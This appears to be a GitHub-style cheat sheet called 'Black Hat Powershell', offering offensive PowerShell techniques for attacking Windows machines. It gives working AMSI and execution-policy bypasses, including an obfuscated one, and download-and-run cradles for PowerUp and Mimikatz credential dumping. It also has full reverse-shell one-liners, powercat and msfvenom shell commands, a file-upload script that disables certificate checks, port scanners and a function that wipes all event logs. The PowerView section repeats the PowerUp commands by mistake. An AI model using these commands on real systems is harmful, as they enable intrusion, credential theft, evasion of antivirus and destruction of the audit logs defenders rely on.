# Black Hat Powershell

A field manual of Powershell tricks for hackers.

## Introduction

**Powershell Locations**
		
		C:\windows\syswow64\windowspowershell\v1.0\powershell
		C:\Windows\System32\WindowsPowerShell\v1.0\powershell

**Run Powershell prompt as a different user** without loading profile to the machine [replace DOMAIN and USER]

`runas /user:domain\user /noprofile powershell.exe`

Or

```
$username = 'domain\user'
$password = 'password'

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process powershell.exe -Credential $credential
```
You can also execute a reverseshell as the new user

Or starts an interactive session with a remote computer.

```
$username = 'domain\user'
$password = 'password'

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Enter-PSSession -ComputerName Server01 -Credential $credential
```

Or invoke a command on a remote computer.

```
$username = 'domain\user'
$password = 'password'

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName Server01 -Credential $credential
```

## Bypass Restrictions

### Bypassing Execution Policy

		powershell -ExecutionPolicy bypass
		powershell -c <cmd>
		powershell -encodedcommand $env:PSExecutionPolicyPreference="bypass"

## Bypass AMSI

AMSI is short for Antimalware Scan Interface.

The goal of AMSI is to prevent the execution of arbitrary code containing malicious content.

### Basic - Forcing an AMSI Initialization Failure

Likely detectable

`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`

### Obfuscated Command

```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

### Downgrading PowerShell

`powershell.exe -version 2`

`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 2`

checking version

`$PSVersionTable`


### Nishang

https://raw.githubusercontent.com/samratashok/nishang/master/Bypass/Invoke-AmsiBypass.ps1

`. .\Invoke-AmsiBypass.ps1`

Or copy the code from github and paste it directly into the powershell console

`Invoke-AmsiBypass -Verbose`

### AMSITrigger - Find Detectable Strings

`https://github.com/RythmStick/AMSITrigger`


## Machine Enumeration

- List users `Get-LocalUser`
- Basic networking information `ipconfig /all`
-  file permissions 
-  registry permissions
-  scheduled and running tasks
-  insecure files
- Print Domain `systeminfo | findstr /B "Domain"`
- Check Powershell version `$PSVersionTable. PSVersion`
- List processes `Get-Process`



## Screenshot


## Keylogger


## Zipping files and directories

`Compress-Archive -Path C:\path\to\file\*.jpg -DestinationPath C:\path\to\archive.zip`

## Unzip

`Expand-Archive -LiteralPath 'C:\Archives\Draft[v1].Zip' -DestinationPath C:\Reference`

## Encryption

### Creating encryption key

```
$EncryptionKeyBytes = New-Object Byte[] 32
[Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($EncryptionKeyBytes)
$EncryptionKeyBytes | Out-File "./encryption.key"
```

### Encrypting file

```
$FileContent = Get-Content ".\file.txt"
$EncryptionKeyData = Get-Content "./encryption.key"
$secureString = ConvertTo-SecureString $FileContent -AsPlainText -Force
$Encrypted = ConvertFrom-SecureString -SecureString $secureString -Key $EncryptionKeyData | Out-File -FilePath "./secret.encrypted"
```

### Decrypting file

```
$EncryptionKeyData = Get-Content "./encryption.key"
$PasswordSecureString = Get-Content "./secret.encrypted" | ConvertTo-SecureString -Key $EncryptionKeyData
$PlainTextPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($PasswordSecureString))
$PlainTextPassword | Out-File -FilePath ./plaintext.txt
$PlainTextPassword
```

## Deleting files

`Remove-Item C:\Test\*.*`

### Find Files
Find GPP Passwords in SYSVOL

```
findstr /S cpassword $env:logonserver\sysvol\*.xml
findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe)
```

### Simple Enumeration Script

Paste the following code in a powershell console and it will present a menu for enumeration

```
Clear-Host
function Show-Menu
{
    param (
        [string]$Title = 'PowEnum Menu'
    )
    Clear-Host
    Write-Host "================ $Title ================"
    Write-Host " "
    Write-Host "1: Press '1' to get OS Version"
    Write-Host "2: Press '2' to get FQDN"
    Write-Host "3: Press '3' to get domain"
    Write-Host "4: Press '4' to get DNS type All"
    Write-Host "5: Press '5' to get MX record"
    Write-Host "6: Press '6' to get WWW record"
    Write-Host "7: Press '7' to get hosts on subnet"
    Write-Host "Q: Press 'Q' to quit."
}
 
do
{
    Show-Menu –Title 'PowEnum Menu'
    Write-Host " "
    $input = Read-Host "what do you want to do?"
    switch ($input)
    {
        '1' {               
                systeminfo | findstr /B /C:"OS Name" /C:"OS Version"  
            }
        '2' {               
                ([System.Net.Dns]::GetHostByName(($env:computerName))).Hostname
            }
        '3' {
                (Get-WmiObject Win32_ComputerSystem).Domain
            }
        '4' {
                $Domain=(Get-WmiObject Win32_ComputerSystem).Domain
                Resolve-DNSName -type All -name $Domain
            }
        '5' {
                $Domain=(Get-WmiObject Win32_ComputerSystem).Domain
                Resolve-DNSName -type MX -name $Domain
            }
        '6' {
                $Domain=(Get-WmiObject Win32_ComputerSystem).Domain
                Write-Host "www.${Domain}"
                Resolve-DNSName -type cname -name "www.${Domain}"
            }
        '7' {
                Write-Host "Be patient, this could take some time..."
                $snet = Get-WmiObject -Class Win32_IP4RouteTable |
                    where { $_.destination -eq '0.0.0.0' -and $_.mask -eq '0.0.0.0'} |
                    Sort-Object metric1 | select nexthop, metric1, interfaceindex
                $line = $snet -split "nexthop="
                $ip = $line -split ";"
                $netw = $ip[1]
                $ipoct = $netw.split(".")
                $sn_value = ($ipoct[0]+"."+$ipoct[1]+"."+$ipoct[2])
                ForEach ($ip in 1..254) {Resolve-DNSName "$sn_value.$ip" -ErrorAction SilentlyContinue }
            }
        'q' {
                 return
            }
    }
    Write-Host " "
    pause
}
until ($input -eq 'q')
```

## Network Discovery
### Port Scanning
#### Single Host Multiple Ports
`1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.100",$_)) "Port $_ is open!"} 2>$null`

#### Single Port Multiple Hosts
`foreach ($ip in 1..20) {Test-NetConnection -Port 80 -InformationLevel "Detailed" 192.168.1.$ip}`

#### Multiple Hosts Multiple Ports
`1..20 | % { $a = $_; 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.$a",$_)) "Port $_ is open!"} 2>$null}`

### Simple Port Scanning Script

Needs testing

```
$port = 445  
$network =  10.63.50
$range = 1..254
$ErrorActionPreference= 'silentlycontinue'
$(Foreach ($add in $range)  
{ $ip = "{0}.{1}" –F $network,$add  
Write-Progress "Scanning Network" $ip -PercentComplete (($add/$range.Count)*100)  
If(Test-Connection –BufferSize 32 –Count 1 –quiet –ComputerName $ip)  
{ $socket = new-object System.Net.Sockets.TcpClient($ip, $port)  
If($socket.Connected) { "$ip port $port open"
$socket.Close() }  
else { "$ip port $port not open" }  
}  
}) | Out-File .\portscan.csv
```

### Advanced Port Scanning Script

Link https://raw.githubusercontent.com/BornToBeRoot/PowerShell_IPv4PortScanner/main/Scripts/IPv4PortScan.ps1

https://github.com/BornToBeRoot/PowerShell_IPv4PortScanner

It is recommended to use Nmap unless there is a reason not to.

### Ping Sweep Oneliner

Paste the following code in a Powershell console. It will ask for input.

```
write-host "Ping Sweep!"; $FirstThreeOctets = Read-Host -Prompt 'First Three Octets (for example: 127.0.0)'; $FirstIP = Read-Host -Prompt 'Start IP (for example: 1)'; $LastIP = Read-Host -Prompt 'End IP (for example: 254)'; $FirstIP..$LastIP | foreach-object { (new-object System.Net.Networkinformation.Ping).Send($FirstThreeOctets + '.' + $_,150) } | where-object {$_.Status -eq 'success'} | select Address; Write-Host 'Done!'
```

It will ask for input as shown

```
Ping Sweep!
First Three Octets (for example: 127.0.0): 10.33.132
Start IP (for example: 1): 1
End IP (for example: 254): 10
```

## Download Files
### Download and Run in Memory

```
powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellScript.ps1');Invoke-PowerShellScript -arg1 value -arg2 value
```

### Download from SMB

`Copy-Item -Source \\server\share\file -Destination C:\path\`

### Download in Powershell - WebClient

```
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://www.contoso.com/file","C:\path\file")
```

### Download with Invoke-WebRequest

```
Invoke-WebRequest -Uri "http://www.contoso.com" -OutFile "C:\path\file"
```

### Download with Wget

```
wget "http://www.contoso.com" -outfile "file"
```

### Download with Authentication

```
Invoke-WebRequest -Uri https://www.contoso.com/ -OutFile C:"\path\file" -Credential "yourUserName"
```


## Upload Files
### The Server - Python
1. Download Python HTTPS Server with Authentication
	
	ADDLINK

2. Create certificate

Create a certificate so you can use SSL

```
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
```

3. Start the server

Usage:

```
python simple-https-server.py 4433 admin:password
```

### The Client - Powershell

1. Create upload.ps1

```
 add-type @"
 using System.Net;
 using System.Security.Cryptography.X509Certificates;
 public class TrustAllCertsPolicy : ICertificatePolicy {
 public bool CheckValidationResult(
 ServicePoint srvPoint, X509Certificate certificate,
 WebRequest request, int certificateProblem) {
 return true;
 }
 }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

echo "========================================================================"
echo "USAGE: ./upload.ps1 https://domain.com/ username:password file_to_upload"
echo "-"
echo "NOTE: script and file to be uploaded must be in the same directory"
echo "========================================================================"

$url=$args[0]
$auth=$args[1]
$filename=$args[2]

$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($auth))

$WebClient = new-object System.Net.WebClient
$WebClient.Headers.Add("Authorization", "Basic " + $encodedCreds)
$WebClient.Headers.Add("X-Atlassian-Token", "nocheck")
$WebClient.UploadFile($url, (Get-Location).Path + "\" + $filename)
```


2. Upload files to server


`./upload.ps1 <https://ip:port/> <admin:password> <file (in current dir)>`

`./upload.ps1 https://192.168.46.1:4433/ admin:password file_to_upload`

## PowerUp.ps1

Link https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

Download and run from attacker's machine

```
powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/PowerUp.ps1');Invoke-AllChecks
```

Download and run from internet

```
powershell iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');Invoke-AllChecks
```

## PowerView.ps1

Link https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

Download and run from attacker's machine

```
powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/PowerUp.ps1');Invoke-AllChecks
```

Download and run from internet

```
powershell iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');Invoke-AllChecks
```

## SharpHound.ps1
https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
## Mimikatz

```
# Invoke-Mimikatz: Dump credentials from memory

powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"

# Import Mimikatz Module to run further commands

powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"

# Invoke-MassMimikatz: Use to dump creds on remote host [replace $env:computername with target server name(s)]

powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1');'$env:COMPUTERNAME'|Invoke-MassMimikatz -Verbose"
```

## Offensive Security Domain Enumeration Script
## Powershell Reverse Shell
### Oneliners
**ReverseShell**

```powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.46.2',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

or 

```powershell
$sm=(New-Object Net.Sockets.TCPClient('192.168.254.1',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
```

### Powershell Reverse Shell Scripts
#### Invoke-PowerShellTcp.ps1
Link https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

```
powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
```

#### Powercat.ps1

Link https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1

**Reverse shell**

	powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.46.2/powercat.ps1');powercat -c 192.168.46.2 -p 443 -e cmd"

**Encoded  reverse shell**

	powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.46.2/powercat.ps1');powercat -c 192.168.1.3 -p 443 -e cmd.exe -ge > encodedshell.ps1
	
	cat encodedshell.ps1 | clip
	
	powershell -E <PASTE>

### MVFVenom

On Kali

`msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1`

On Target

`powershell.exe -ExecutionPolicy Bypass -NoExit -File shell.ps1`

### Empire

## Enable RDP

Requires admin privilege

Enable the remote desktop protocol

`Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0`

Enable remote desktop through the Windows Firewall

`Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`


## Clear Event Logs

Required admin privilege

```
function clear-all-event-logs ($computerName="localhost")
{
   $logs = Get-EventLog -ComputerName $computername -List | ForEach-Object {$_.Log}
   $logs | ForEach-Object {Clear-EventLog -ComputerName $computername -LogName $_ }
   Get-EventLog -ComputerName $computername -list
}

clear-all-event-logs -ComputerName <hostname>
```

Expected output

```
Max(K) Retain OverflowAction        Entries Log
------ ------ --------------        ------- ---
15,168      0 OverwriteAsNeeded           0 Application
15,168      0 OverwriteAsNeeded           0 DFS Replication
512         7 OverwriteOlder              0 DxStudio
20,480      0 OverwriteAsNeeded           0 Hardware Events
512         7 OverwriteOlder              0 Internet Explorer
20,480      0 OverwriteAsNeeded           0 Key Management Service
16,384      0 OverwriteAsNeeded           0 Microsoft Office Diagnostics
16,384      0 OverwriteAsNeeded           0 Microsoft Office Sessions
30,016      0 OverwriteAsNeeded           1 Security
15,168      0 OverwriteAsNeeded           2 System
15,360      0 OverwriteAsNeeded           0 Windows PowerShell
```

## References
- Useful Cheatsheet https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70
- Port scanning https://www.sans.org/blog/pen-test-poster-white-board-powershell-built-in-port-scanner/
- Powershell vs Bash https://mathieubuisson.github.io/powershell-linux-bash/
- Zipping files https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.archive/compress-archive?view=powershell-7.2
- Clearing Event Logs https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.archive/expand-archive?view=powershell-7.2

